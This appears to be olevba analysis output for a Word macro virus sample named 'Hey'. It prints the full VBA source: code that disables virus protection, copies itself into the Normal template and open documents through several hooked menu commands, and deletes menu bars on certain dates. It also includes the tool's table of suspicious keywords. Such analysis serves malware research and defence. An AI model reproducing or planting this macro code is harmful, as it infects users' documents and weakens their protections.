olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hey-434efe4400133decbc633e8ef4938f2ca1127f15
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hey-434efe4400133decbc633e8ef4938f2ca1127f15 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen(): Options.VirusProtection = 0:
ÁáÉ¦Ł×
End Sub
Sub ÁáÉ¦Ł×(): Set é = NormalTemplate.VBProject.VBComponents(1).CodeModule: Set á = ActiveDocument.VBProject.VBComponents(1).CodeModule: Set í = ThisDocument.VBProject.VBComponents(1).CodeModule
If é.CountOfLines = 0 Then é.InsertLines 1, í.Lines(1, 26)
If á.CountOfLines = 0 Then á.InsertLines 1, í.Lines(1, 26)
End Sub
Sub AutoNew(): ÁáÉ¦Ł×: MsgBox "Yeah": End Sub
Sub DateiNeu(): Dialogs(wdDialogFileNew).Show: ÁáÉ¦Ł×: End Sub
Sub BearbeitenEinfügen(): ÁáÉ¦Ł×: End Sub
Sub BearbeitenKopieren(): ÁáÉ¦Ł×: End Sub
Sub BearbeitenAusschneiden(): ÁáÉ¦Ł×: End Sub
Sub FormatZeichen(): ÁáÉ¦Ł×: End Sub
Sub ExtrasOptionen(): ÁáÉ¦Ł×: End Sub
Sub DateiÖffnen(): Dialogs(wdDialogFileOpen).Show: ÁáÉ¦Ł×: End Sub
Sub DocumentOpen(): Dialogs(wdDialogFileOpen).Show: ÁáÉ¦Ł×: End Sub
Sub DateiSchließen(): MsgBox "Yeah": End Sub
Sub DateiBeenden(): ÁáÉ¦Ł×: End Sub
'Hey this is the wild virus
Sub pay():
CommandBars("Tools").Controls("Makro").Enabled = False
If Day(15) And Month(Now) Then CommandBars("Info").Delete
If Day(30) And Month(Now) Then CommandBars("Table").Delete
If Day(1) And Month(Now) Then CommandBars("Insert").Delete
If Day(10) And Month(6) Then CommandBars("View").Delete
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |DocumentOpen        |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
